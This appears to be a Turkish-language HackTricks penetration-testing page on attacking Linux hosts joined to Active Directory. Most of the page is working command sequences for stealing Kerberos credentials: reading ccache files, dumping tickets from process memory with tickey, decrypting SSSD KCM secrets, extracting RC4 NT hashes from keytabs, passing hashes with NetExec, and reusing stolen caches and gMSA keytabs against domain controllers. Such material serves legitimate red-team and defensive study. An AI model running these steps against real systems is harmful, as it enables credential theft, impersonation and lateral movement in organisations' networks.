# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Bir Linux makinesi Active Directory ortamı içinde de bulunabilir.

AD içindeki bir Linux makinesi **Kerberos materyallerini yerel olarak depolayabilir**: kullanıcı ccache'leri, makine/servis keytab'leri ve SSSD tarafından yönetilen secret'lar. Bu artefaktlar genellikle diğer Kerberos credential'ları gibi yeniden kullanılabilir. Bunların çoğunu okuyabilmek için ticket'ın sahibi olan kullanıcı veya makinede **root** olmanız gerekir.

## Enumeration

### Linux'tan AD enumeration

Linux'ta bir AD'ye erişiminiz varsa (veya Windows'ta bash kullanıyorsanız), AD'yi enumerate etmek için [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) aracını deneyebilirsiniz.

Ayrıca **Linux'tan AD enumerate etmenin diğer yollarını** öğrenmek için aşağıdaki sayfaya göz atabilirsiniz:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA, temel olarak **Unix** ortamları için Microsoft Windows **Active Directory**'ye açık kaynaklı bir **alternatif**tir. Yönetim açısından Active Directory'ye benzer bir yapı sağlamak üzere eksiksiz bir **LDAP directory**'yi MIT **Kerberos** Key Distribution Center ile birleştirir. CA ve RA certificate yönetimi için Dogtag **Certificate System** kullanan FreeIPA, smartcard'lar dahil **multi-factor** authentication'ı destekler. SSSD, Unix authentication süreçleri için entegre edilmiştir. Daha fazla bilgi için:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefaktları

Ticket'lara dokunmadan önce **host'un AD'ye nasıl join edildiğini** ve **Kerberos materyallerinin gerçekte nerede depolandığını** belirleyin. Modern Linux host'larında bu işlem genellikle yalnızca `/tmp` içindeki flat file'lar kullanılarak değil, `realmd` + `adcli` + `sssd` ile gerçekleştirilir:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Bu, host'un AD'ye güvenip güvenmediğini, SSSD'nin identity veya ticket'ları cache'leyip cache'lemediğini ve **machine/service keytab** veya **KCM secret**'larının abuse için kullanılabilir olup olmadığını hızlıca gösterir.

## Ticket'larla oynama

### Pass The Ticket

Bu sayfada bir **Linux host içinde Kerberos ticket'larını bulabileceğiniz** farklı konumları göreceksiniz. Aşağıdaki sayfada bu CCache ticket formatlarını Kirbi'ye (Windows'ta kullanmanız gereken format) nasıl dönüştüreceğinizi ve bir PTT attack'ını nasıl gerçekleştireceğinizi öğrenebilirsiniz:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

**Linux'a özgü ticket harvesting workflow'ları** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, vb.) için özel sayfaya bakın:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### /tmp üzerinden CCACHE ticket reuse

CCACHE dosyaları, **Kerberos credential'larını saklamak** için kullanılan binary formatlardır. `FILE:/tmp/krb5cc_%{uid}` hâlâ yaygındır; ancak modern Linux deployment'larında `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` veya `KCM:%{uid}` de kullanılır. Ticket'ların `/tmp` içinde bulunduğunu varsaymadan önce **`KRB5CCNAME`** environment variable'ını ve `default_ccache_name` ayarını kontrol edin.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Keyring'den CCACHE ticket yeniden kullanımı

**Bir process'in memory'sinde depolanan Kerberos ticket'ları extract edilebilir**, özellikle makinenin ptrace protection'ı (`/proc/sys/kernel/yama/ptrace_scope`) devre dışı bırakılmışsa. Bu amaçla kullanılabilecek bir tool [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) adresinde bulunur; session'lara inject ederek ve ticket'ları `/tmp` içine dump ederek extraction işlemini kolaylaştırır.

Bu tool'u configure etmek ve kullanmak için aşağıdaki adımlar izlenir:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Bu prosedür çeşitli session'lara inject etmeyi deneyecek ve başarıyı, çıkarılan ticket'ları `/tmp` altında `__krb_UID.ccache` adlandırma kuralıyla depolayarak gösterecektir.

### CCACHE ticket reuse from SSSD KCM

SSSD, veritabanının bir kopyasını `/var/lib/sss/secrets/secrets.ldb` yolunda tutar. Buna karşılık gelen key, `/var/lib/sss/secrets/.secrets.mkey` yolunda hidden file olarak depolanır. Varsayılan olarak key yalnızca **root** permissions'ına sahipseniz okunabilir.

**`SSSDKCMExtractor`**'ı --database ve --key parametreleriyle çalıştırmak, veritabanını parse eder ve **secrets'ın şifresini çözer**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**credential cache Kerberos blob**, Mimikatz/Rubeus'a aktarılabilecek kullanılabilir bir Kerberos CCache dosyasına dönüştürülebilir.

### Hızlı keytab triyajı
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### /etc/krb5.keytab dosyasından hesapları çıkarma

Root ayrıcalıklarıyla çalışan services için gerekli olan service account anahtarları, güvenli şekilde **`/etc/krb5.keytab`** dosyalarında saklanır. Services için passwords işlevi gören bu anahtarların gizliliği kesinlikle korunmalıdır.

keytab dosyasının içeriğini incelemek için **`klist`** kullanılabilir. Linux'ta `klist -k -K -e`, principal'ları, key version number'ları, encryption type'ları ve ham key materyalini yazdırır. Key type **23 / RC4-HMAC** ise key value, aynı zamanda ilgili principal'ın **NT hash** değeridir.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Linux kullanıcıları için **`KeyTabExtract`**, NTLM hash yeniden kullanımı için kullanılabilen RC4 HMAC hash'ini çıkarma işlevi sunar. Bunun yalnızca keytab hâlâ **etype 23 / RC4-HMAC** materyali içeriyorsa işe yaradığını unutmayın. **AES-only** ortamlarda yeniden kullanılabilir bir NT hash elde edemeyebilirsiniz; ancak keytab aracılığıyla Kerberos kullanarak doğrudan kimlik doğrulaması yapabilirsiniz.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS'ta, **`bifrost`** keytab dosyası analizi için bir araç olarak kullanılır.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Çıkarılan hesap ve hash bilgileri kullanılarak, **`NetExec`** gibi araçlarla sunuculara bağlantılar kurulabilir.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### `/etc/krb5.keytab` içindeki machine account'ı yeniden kullanma

`realmd`/`adcli`/`sssd` ile join edilmiş sistemlerde `/etc/krb5.keytab` genellikle **computer account** ile bir veya daha fazla **host/service principal** içerir. **root** erişiminiz varsa, dosyayı doğrudan dump etmeyin: `klist -k` tarafından listelenen principal'lardan birini kullanarak TGT isteyin ve Linux host'un kendisi olarak işlem yapın.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Bu, özellikle **computer object** AD'de delegated rights sahibi olduğunda veya host'un **gMSA** gibi diğer secret'ları almasına izin verildiğinde kullanışlıdır.

### Stolen Kerberos material'ı Linux-first AD tooling ile yeniden kullanma

Geçerli bir `ccache` veya kullanılabilir bir keytab elde ettiğinizde, her şeyi önce Windows formatlarına dönüştürmeden **doğrudan Linux'tan** AD üzerinde işlem yapabilirsiniz. Modern araçların çoğu `KRB5CCNAME` / Kerberos auth'u native olarak destekler:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Bu, **Linux post-exploitation** ile **AD object abuse** arasında iyi bir köprüdür. Nesne düzeyindeki abuse yolları için şunlara bakın:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefact'ları

Güncel Linux deployment'ları **Managed Service Account**'ları doğrudan AD'den kullanabilir. Pratikte bu, bir Linux server'ı compromise ettikten sonra yalnızca host keytab'ını değil, aynı zamanda bir gMSA'dan oluşturulmuş **service-specific keytab**'ları da bulabileceğiniz anlamına gelir. İncelenecek yaygın konumlar arasında `/etc/gmsad.conf`, deployment'a özel config dosyaları ve `/etc` altındaki ek `*.keytab` dosyaları bulunur.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Bu, herhangi bir Windows endpoint'ine dokunmadan, söz konusu gMSA'ya bağlı SPN'ler için yeniden kullanılabilir bir Kerberos kimliği sağlar. AD'de daha yüksek ayrıcalıklar elde ettikten sonra **domain-side** gMSA/dMSA abuse için şuraya bakın:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## Referanslar

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
